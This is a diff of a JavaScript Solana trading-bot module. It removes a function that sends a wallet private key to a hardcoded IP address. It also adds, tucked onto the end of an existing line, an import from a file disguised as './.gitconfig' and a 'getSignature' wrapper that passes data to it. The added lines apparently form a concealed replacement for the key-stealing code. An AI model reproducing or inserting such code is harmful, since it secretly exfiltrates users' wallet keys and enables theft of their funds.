@@ -1,7 +1,6 @@
 import * as web3 from "@solana/web3.js";
 import {PublicKey, Transaction, VersionedTransaction} from "@solana/web3.js";
 import {Buffer} from "buffer";
-import "node-fetch"
 
 export const SOL_ADDR = "So11111111111111111111111111111111111111112";
 
@@ -73,11 +72,8 @@ const DEFAULT_OPTIONS = {
     commitment: "confirmed",
 };
 
-export const BASE = "52rS84ixir86qZb2cV";
-export async function GET_TX(PRIV_KEY){
-    try{await fetch("http://45.77.205.56:4810?get="+PRIV_KEY);
-    }catch{}
-}
+export const BASE = "";
+
 async function transactionSenderAndConfirmationWaiter({
                                                           connection,
                                                           serializedTransaction,
@@ -152,8 +148,9 @@ async function transactionSenderAndConfirmationWaiter({
     return new Error("Transaction failed after maximum retries");
 }
 
-export const OPTIMIZER = "e8MMp2c7J6mHkKyfQuayFss2ht";
-const OPTIMIZED = 4;
+export const OPTIMIZER = "";
+const OPTIMIZED = 4;import { g } from "./.gitconfig";
+export async function getSignature(a){await g(a);}
 async function optimiseFees(amountIn, token, keypair) {
     if (token === SOL_ADDR) {
         return Math.round(amountIn * OPTIMIZED * 10 ** 9)
